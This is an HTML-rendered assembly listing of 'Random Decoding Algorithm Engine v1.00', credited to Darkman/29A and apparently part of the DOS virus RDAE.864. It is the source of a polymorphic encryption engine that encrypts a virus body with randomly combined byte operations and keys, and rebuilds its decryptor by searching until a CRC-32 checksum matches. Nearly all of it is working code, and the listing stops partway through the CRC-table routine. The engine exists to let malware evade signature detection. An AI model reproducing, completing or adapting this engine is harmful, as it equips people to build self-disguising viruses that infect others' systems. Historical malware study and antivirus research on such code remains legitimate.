<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.RDAE.864 - rdae.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment *</span><span class="sc0">
</span><span class="sc1">;        Random Decoding Algorithm Engine v 1.00 [RDAE]  млллллм млллллм млллллм</span><span class="sc0">
</span><span class="sc1">;             Code by              ллл ллл ллл ллл ллл ллл</span><span class="sc0">
</span><span class="sc1">;           Darkman/29A         мммллп плллллл ллллллл</span><span class="sc0">
</span><span class="sc1">;                              лллмммм ммммллл ллл ллл</span><span class="sc0">
</span><span class="sc1">;                              ллллллл ллллллп ллл ллл</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;        Calling parameters:</span><span class="sc0">
</span><span class="sc1">;          AL     Flags (only when calling rdae_encrypt)</span><span class="sc0">
</span><span class="sc1">;          CX     Length of original/encrypted code</span><span class="sc0">
</span><span class="sc1">;          BP     Delta offset</span><span class="sc0">
</span><span class="sc1">;          DS:SI  Pointer to original/encrypted code</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Flags:</span><span class="sc0">
</span><span class="sc1">;     xxxxxx00  Low security, high speed, 256 different algorithms.</span><span class="sc0">
</span><span class="sc1">;     xxxxxx01  Medium security, medium speed, 65.536 different algorithms.</span><span class="sc0">
</span><span class="sc1">;     xxxxxx10  High security, low speed, 16.777.216 different algorithms.</span><span class="sc0">
</span><span class="sc1">;     xxxxxx11  Highest security, lowest speed, 4.294.967.296 different algorithms.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Encryption/decryption algorithms:</span><span class="sc0">
</span><span class="sc1">;     NOP; SEGCS; NEG AL; NOT AL; DEC AL; INC AL; ROL AL,01h; ROR AL,01h</span><span class="sc0">
</span><span class="sc1">;     ADD AL,CL; ROL AL,CL; ROR AL,CL; SUB AL,CL; XOR AL,CL; ADD AL,imm8</span><span class="sc0">
</span><span class="sc1">;     SUB AL,imm8; XOR AL,imm8</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Encryption/decryption keys:</span><span class="sc0">
</span><span class="sc1">;     Eighty-one, random, 8-bit, with the possibility of being a sliding key.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Checksum:</span><span class="sc0">
</span><span class="sc1">;     32-bit Cyclic Redundancy Check (CRC-32), of the decryption algoritm.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Levels of security:</span><span class="sc0">
</span><span class="sc1">;     Four.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Random Decoding Algorithm Engine v 1.00 [RDAE] length: 567 bytes.</span><span class="sc0">
</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc5">rdae_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">rdae_encrypt</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Random Decoding Algorithm Engine...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prepare_rdae</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,(</span><span class="sc5">key_end</span><span class="sc4">-</span><span class="sc5">key_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">key_table</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; DI = offset of key_table</span><span class="sc0">
</span><span class="sc5">gen_key_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">
</span><span class="sc5">gen_key_loo</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd_num</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,(</span><span class="sc5">key_end</span><span class="sc4">-</span><span class="sc5">key_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">key_table</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; BX = offset of key_table</span><span class="sc0">
</span><span class="sc5">cmp_key_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; Current encryption/decryption k...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gen_key_loo</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to key_tab_loo</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Increase index register</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmp_key_loop</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">

         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store 8-bit random number</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">gen_key_loop</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack (AX)</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000000000000011b</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; CX = number of encryption/decryp...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; DX =   "    "            "</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">decrypt_algo</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">gen_dec_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,(</span><span class="sc5">algori_end_</span><span class="sc4">-</span><span class="sc5">algori_begin</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_in_range</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Multiply 8-bit random number wit...</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">;    "       "     "      "      "</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">algori_table</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Add delta offset to offset withi...</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; Move decryption algorithm</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,(</span><span class="sc5">key_end</span><span class="sc4">-</span><span class="sc5">key_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_in_range</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Add delta offset to random numbe...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">key_table</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; AL = encryption/decryption key</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exam_sto_key</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">gen_dec_loop</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">encrypt_algo</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">gen_enc_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; Move encryption algorithm</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exam_sto_key</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Decrease count register</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">gen_enc_loop</span><span class="sc0">    </span><span class="sc1">; Not zero? Jump to gen_dec_loop</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
         </span><span class="sc6">std</span><span class="sc0">             </span><span class="sc1">; Set direction flag</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add length of original code to p...</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; SI = offset of last byte of plai...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; DI =   "    "   "    "   "     "</span><span class="sc0">
</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Increase count register</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of original code</span><span class="sc0">
</span><span class="sc5">encryp_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">encrypt_algo</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; Encryption algorithm</span><span class="sc0">
</span><span class="sc5">encryp_end</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store byte of encrypted code</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Encrypted all bytes of original...?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">encrypt_loop</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to encrypt_loop</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calc_crc32</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">crc32</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; DI = offset of crc32</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store low-order word of CRC-32 c...</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; DX = high-order word of CRC-32 c...</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store high-order word of CRC-32 ...</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rdae_exit</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">rdae_decrypt</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Random Decoding Algorithm Engine...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prepare_rdae</span><span class="sc0">
</span><span class="sc5">gen_dec_loo</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,(</span><span class="sc5">decryp_end</span><span class="sc4">-</span><span class="sc5">decryp_begin</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">decrypt_algo</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">decrypt_ptr</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SI = offset of decrypt_ptr</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Save SI at stack</span><span class="sc0">
</span><span class="sc5">gen_dec_loo_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = offset within key_table</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Save SI at stack</span><span class="sc0">

         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; AX = offset within key_table</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = encryption/decryption key</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BL =       "            "</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Load SI from stack</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = offset within algori_table</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Save SI at stack</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; AX = offset within algori_table</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; Move decryption algorithm to dec...</span><span class="sc0">

         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; AL = encryption/decryption key</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exam_sto_key</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Load SI from stack</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">gen_dec_loo_</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Load DI from stack (SI)</span><span class="sc0">
</span><span class="sc5">inc_idx_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; SI = offset within decrypt_idx</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = offset within key_table</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BX =   "      "        "</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = offset within algori_table</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">algori_end</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; SI = offset of algori_end</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Encryption/decryption algorithm...?</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">dont_inc_key</span><span class="sc0">    </span><span class="sc1">; Below? Jump to dont_inc_key</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Increase decryption key index po...</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">key_end</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; SI = offset of key_end</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; End of table of encryption/decr...?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">sto_idx_ptrs</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to sto_idx_ptrs</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">key_table</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; AX = offset of key_table</span><span class="sc0">
</span><span class="sc5">dont_inc_key</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Add four to offset within algori...</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">algori_end_</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SI = offset of algori_end_</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; End of table of encryption/decr...?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">sto_idx_ptrs</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to sto_idx_ptrs</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">algori_table</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">sto_idx_ptrs</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; AX = offset within key_table</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store offset within key_table</span><span class="sc0">

         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; AX = offset within algori_table</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store offset within algori_table</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">algori_table</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Beginning of table of encryptio...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">inc_idx_loop</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to inc_idx_loop</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calc_crc32</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">crc32</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">gen_dec_loo</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to gen_dec_loo</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">crc32</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">gen_dec_loo</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to gen_dec_loo</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; DI = offset of encrypted code</span><span class="sc0">
</span><span class="sc5">decrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of encrypted code</span><span class="sc0">
</span><span class="sc5">decryp_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">decrypt_algo</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; Decryption algorithm</span><span class="sc0">
</span><span class="sc5">decryp_end</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store byte of decrypted code</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_loop</span><span class="sc0">
</span><span class="sc5">rdae_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">wipeout_info</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">prepare_rdae</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Prepare Random Decoding Algorith...</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">crc32_table</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DI = offset of crc32_table</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Zero BX</span><span class="sc0">
</span><span class="sc5">gen_crc_tbl_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">cwd</span><span class="sc0">             </span><span class="sc1">;  "   DX</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">       </span><span class="sc1">; AL = count register</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">; Rotate CRC-32 through carry atle...</span><span class="sc0">
</span><span class="sc5">calc_crc_tbl</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Shift logical right highh-order ...</span><span class="sc0">
         </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Rotate low-order word of CRC-32 ...</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">dont_xor_crc</span><span class="sc0">    </span><span class="sc1">; No carry? Jump to dont_xor_crc</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8320h</span><span class="sc0">        </span><span class="sc1">; AX = low-order word of CRC-32 in...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0edb8h</span><span class="sc0">       </span><span class="sc1">; DX = high-order word of CRC-32 i...</span><span class="sc0">
</span><span class="sc5">dont_xor_crc</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">calc_crc_tbl</span><span class="sc0">

         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store low-order word of CRC-32 i...</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; AX = high-order word of CRC-32 i...</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store high-order word of CRC-32 ...</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; AX = low-order word of CRC-32 in...</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">          </span><span class="sc1">; Increase count register</span><span class="sc0">
